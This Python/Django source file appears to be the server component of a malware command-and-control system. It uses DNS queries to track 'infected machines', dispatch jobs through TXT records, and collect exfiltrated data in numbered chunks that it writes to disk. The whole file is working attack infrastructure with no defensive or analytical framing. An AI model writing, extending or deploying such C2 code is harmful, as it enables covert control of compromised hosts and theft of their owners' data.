import os
from datetime import timedelta
from re import Match

from decouple import config
from django.utils import timezone

from djangoproject.constants.DnsMatchEnum import DnsMatchEnum
from djangoproject.models import InfectedMachine, JobEndQueue
from djangoproject.services.DnsService import DnsService


class ExecService:

    def process(self, query_type: DnsMatchEnum, data: Match, client_ip: str):
        if query_type == DnsMatchEnum.GET_JOB:
            self.process_job_get(data.group(1), client_ip)
        elif query_type == DnsMatchEnum.RETURN_JOB_FRAGMENT:
            self.process_job_return_fragment(data.group(3), data.group(2), data.group(1))
        elif query_type == DnsMatchEnum.JOB_FINISHED:
            self.process_job_finish(data.group(1))

    def process_job_get(self, machine_id: str, ip: str):
        machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()

        if machine is None:
            machine = self.create_machine(machine_id)

        machine.last_handshake_at = timezone.now()
        machine.ip = ip
        machine.job_ask_count += 1
        machine.save()

        DnsService().remove_job_txt(machine).apply()

    def process_job_return_fragment(self, machine_id: str, data: str, chunk_id: str):
        machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
        if machine is None:
            return

        job = machine.get_current_job()
        if job is None:
            return

        if job.started_at is None:
            job.started_at = timezone.now()

        job.chunks_received_count += 1
        job.save()

        data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
        os.makedirs(data_folder, exist_ok=True)

        with open(f"{data_folder}/chunk-{chunk_id}", "w") as f:
            f.write(data)

    def process_job_finish(self, machine_id: str):
        machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
        if machine is None:
            return

        job = machine.get_current_job()
        if job is None:
            return

        job.finished_at = timezone.now()
        job.save()

        JobEndQueue.objects.create(job_id=job.id, processable_at=timezone.now() + timedelta(minutes=5))

    def create_machine(self, machine_id: str) -> InfectedMachine:
        machine = InfectedMachine(dns_identifier=machine_id)
        machine.save()

        return machine
